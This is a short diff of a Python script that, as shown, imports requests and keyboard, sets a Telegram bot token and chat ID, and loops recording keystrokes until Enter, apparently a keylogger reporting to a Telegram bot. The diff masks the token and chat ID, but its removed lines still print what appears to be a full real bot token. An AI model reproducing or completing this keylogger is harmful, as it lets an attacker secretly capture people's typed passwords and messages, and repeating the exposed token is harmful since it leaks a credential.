@@ -2,8 +2,8 @@ import requests
 import keyboard
 
 
-API_TOKEN = '7744298681:AAEFAFsM0xJxhbeYO25tk1JbWY_dV_sUvB8'
-CHAT_ID = '6739681362'
+API_TOKEN = '7744298681:AAE.................'
+CHAT_ID = '67...........'
 while True:
     def capture_text():
         events = keyboard.record(until='enter') 
